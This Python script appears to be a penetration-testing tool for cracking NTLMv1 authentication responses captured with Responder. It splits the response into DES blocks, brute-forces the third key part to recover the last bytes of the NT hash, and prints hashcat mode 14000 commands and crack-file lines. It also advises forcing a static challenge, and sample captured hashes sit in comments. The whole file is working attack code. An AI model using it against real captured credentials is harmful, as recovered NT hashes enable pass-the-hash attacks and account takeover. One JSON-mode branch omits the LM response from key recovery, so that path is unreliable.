import hashlib, binascii
import argparse
import json
from Crypto.Cipher import DES

def recover_key_from_ct3(ct3_hex, challenge_hex, ess_hex=None):
    # Convert hex inputs to bytes
    ct3_bytes = bytes.fromhex(ct3_hex)
    challenge_bytes = bytes.fromhex(challenge_hex)

    if len(ct3_bytes) != 8 or len(challenge_bytes) != 8:
        raise ValueError("ct3 and challenge must be 8 bytes (16 hex chars) each")

    # Convert bytes to integer representation
    ct3_val = int.from_bytes(ct3_bytes, 'big')
    challenge_val = int.from_bytes(challenge_bytes, 'big')

    # Handle ESS case using fast MD5 hash
    if ess_hex:
        ess_bytes = bytes.fromhex(ess_hex)
        if len(ess_bytes) != 24:
            raise ValueError("ESS must be 24 bytes (48 hex chars)")
        if ess_bytes[8:] == b'\x00' * 16:
            challenge_bytes = hashlib.md5(challenge_bytes + ess_bytes[:8]).digest()[:8]
            challenge_val = int.from_bytes(challenge_bytes, 'big')

    # **Optimized DES brute-force loop**
    found_key = None
    for i in range(0x10000):  # 16-bit key space
        # **Optimized 7-byte to 8-byte DES key transformation**
        nthash_bytes = [
            i & 0xFF,
            (i >> 8) & 0xFF,
            0, 0, 0, 0, 0
        ]
        key_bytes = bytes([
            nthash_bytes[0] | 1,
            ((nthash_bytes[0] << 7) | (nthash_bytes[1] >> 1)) & 0xFF | 1,
            ((nthash_bytes[1] << 6) | (nthash_bytes[2] >> 2)) & 0xFF | 1,
            ((nthash_bytes[2] << 5) | (nthash_bytes[3] >> 3)) & 0xFF | 1,
            ((nthash_bytes[3] << 4) | (nthash_bytes[4] >> 4)) & 0xFF | 1,
            ((nthash_bytes[4] << 3) | (nthash_bytes[5] >> 5)) & 0xFF | 1,
            ((nthash_bytes[5] << 2) | (nthash_bytes[6] >> 6)) & 0xFF | 1,
            ((nthash_bytes[6] << 1)) & 0xFF | 1
        ])

        # **Use PyCryptodome for fast DES encryption**
        cipher = DES.new(key_bytes, DES.MODE_ECB)
        encrypted = cipher.encrypt(challenge_bytes)

        # **Fast integer comparison instead of byte-by-byte check**
        if int.from_bytes(encrypted, 'big') == ct3_val:
            found_key = i
            break

    if found_key is None:
        return None  # Key not found

    # **Return key in correct format (low-order byte first, as in C output)**
    return f"{found_key & 0xFF:02x}{(found_key >> 8) & 0xFF:02x}"


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--ntlmv1', help='NTLMv1 Hash in responder format', required=True)
    parser.add_argument('--hashcat', help='hashcat path, eg: ~/git/hashcat', required=False)
    parser.add_argument('--hcutils', help='hashcat-utils path, eg: ~/git/hashcat-utils', required=False)
    parser.add_argument('--json', help='if this is set to anything it will output json, eg: --json 1', required=False)
    parser.add_argument('--ct3', help='if this is set to anything it will calculate ct3: eg --ct3 1', required=False)
    args = parser.parse_args()
    # SERVER1$::MOG:7EF3F506F5EA510E00000000000000000000000000000000:1217169BD7BE0270A033899BD440016D3E6DACAF5894D504:ff81dfd6b12c269d
    # evilmog::DUSTIN-5AA37877:E343946E455EFC72746CF587C42022982F85252CC731BB25:51A539E6EE061F647CD5D48CE6C686653737C5E1DE26AC4C:1122334455667788
    hashsplit = args.ntlmv1.split(':')
    challenge = hashsplit[5]
    lmresp = hashsplit[3]
    ntresp = hashsplit[4]
    ct3 = ntresp[32:48]
    data = {'ntlmv1': args.ntlmv1, 'user': hashsplit[0], 'domain': hashsplit[2], 'challenge': challenge, 'lmresp': lmresp,
            'ntresp': ntresp, 'ct3': ct3}

    if lmresp[20:48] != "0000000000000000000000000000":
        ct1 = ntresp[0:16]
        ct2 = ntresp[16:32]
        ct3 = ntresp[32:48]
        if args.json is None:
            print("Hashfield Split:")
            print(str(hashsplit) + "\n")

            print("Hostname: " + hashsplit[2])
            print("Username: " + hashsplit[0])
            print("Challenge: " + challenge)
            print("LM Response: " + lmresp)
            print("NT Response: " + ntresp)
            print("CT1: " + ct1)
            print("CT2: " + ct2)
            print("CT3: " + ct3 + "\n")

            print("To Calculate final 4 characters of NTLM hash use:")
            if args.hcutils:
                print(args.hcutils + "/ct3_to_ntlm.bin " + ct3 + " " + challenge + "\n")
            else:
                print("./ct3_to_ntlm.bin " + ct3 + " " + challenge + "\n")
            
            # Recover PT3 (NTLM 3rd part)
            if args.ct3:
                pt3 = recover_key_from_ct3(ct3, challenge)
                print("PT3: " + pt3 + "\n")
            # ./ct3_to_ntlm.bin 2e1e4bf33006ba41 cb8086049ec4736c

            print("To crack with hashcat create a file with the following contents:")
            print(ct1 + ":" + challenge)
            print(ct2 + ":" + challenge + "\n")

            print("echo \"" + ct1 + ":" + challenge + "\">>14000.hash")
            print("echo \"" + ct2 + ":" + challenge + "\">>14000.hash\n")

            print("To crack with hashcat:")
            if args.hashcat:
                print(
                    args.hashcat + "/hashcat -m 14000 -a 3 -1 " + args.hashcat + "/charsets/DES_full.charset --hex-charset 14000.hash ?1?1?1?1?1?1?1?1\n")
            else:
                print("./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset 14000.hash ?1?1?1?1?1?1?1?1\n")

    if lmresp[20:48] == "0000000000000000000000000000":
        clientchallenge = hashsplit[5]
        combinedchallenge = clientchallenge + lmresp[0:16]

        m = hashlib.md5()
        m.update(binascii.unhexlify(combinedchallenge))
        md5hash = m.hexdigest()
        srvchallenge = md5hash[0:16]
        data['srvchallenge'] = srvchallenge
        ct1 = ntresp[0:16]
        ct2 = ntresp[16:32]

        if args.json == None:
            print(
                "Hash response is ESS, consider using responder with --lm or --disable-ess with a static challenge of 1122334455667788")
            print("[-] Client Challenge: " + clientchallenge)
            print("[-] LMResp[0:16]: " + lmresp[0:16])
            print("[-] Combined Challenge: " + combinedchallenge)
            print("Hashfield Split:")
            print(str(hashsplit) + "\n")
            print("[-] MD5 Hash of Combined Challenge: " + md5hash)
            print("Hostname: " + hashsplit[2])
            print("Username: " + hashsplit[0])
            print("LM Response: " + lmresp)
            print("NT Response: " + ntresp)
            print("SRV Challenge: " + srvchallenge + "\n")

            print("To Calculate final 4 characters of NTLM hash use:")
            # ./ct3_to_ntlm.bin 2e1e4bf33006ba41 cb8086049ec4736c 338d08f8e26de93300000000000000000000000000000000
            if args.hcutils:
                print(args.hcutils + "/ct3_to_ntlm.bin " + ct3 + " " + clientchallenge + " " + lmresp + "\n")
            else:
                print("./ct3_to_ntlm.bin " + ct3 + " " + clientchallenge + " " + lmresp + "\n")

            if args.ct3:
                pt3 = recover_key_from_ct3(ct3, challenge, lmresp)
                print("PT3: " + pt3 + "\n")

            print("To crack with hashcat create a file with the following contents:")
            print(ct1 + ":" + srvchallenge)
            print(ct2 + ":" + srvchallenge + "\n")
            print("echo \"" + ct1 + ":" + srvchallenge + "\">>14000.hash")
            print("echo \"" + ct2 + ":" + srvchallenge + "\">>14000.hash\n")

            print("To crack with hashcat:")
            if args.hashcat:
                print(
                    args.hashcat + "/hashcat -m 14000 -a 3 -1 " + args.hashcat + "/charsets/DES_full.charset --hex-charset 14000.hash ?1?1?1?1?1?1?1?1\n")
            else:
                print("./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset 14000.hash ?1?1?1?1?1?1?1?1\n")


    if args.json != None:
        if lmresp[20:48] != "0000000000000000000000000000":
            if args.hcutils:
                data['ct3_crack'] = (args.hcutils + "/ct3_to_ntlm.bin " + ct3 + " " + challenge)
            else:
                data['ct3_crack'] = ("ct3_to_ntlm.bin " + ct3 + " " + challenge)
            pt3 = recover_key_from_ct3(ct3, challenge)
            data['pt3'] = pt3
            data['hash1'] = (ct1 + ":" + challenge)
            data['hash2'] = (ct2 + ":" + challenge)
        if lmresp[20:48] == "0000000000000000000000000000":
            if args.hcutils:
                data['ct3_crack'] = (args.hcutils + "/ct3_to_ntlm.bin " + ct3 + " " + clientchallenge + " " + lmresp)
            else:
                data['ct3_crack'] = ("ct3_to_ntlm.bin " + ct3 + " " + clientchallenge + " " + lmresp)
            pt3 = recover_key_from_ct3(ct3, challenge)
            data['pt3'] = pt3
            data['hash1'] = (ct1 + ":" + srvchallenge)
            data['hash2'] = (ct2 + ":" + srvchallenge)

        # process data
        json_data = json.dumps(data)
        print(json_data)


if __name__ == "__main__":
    main()
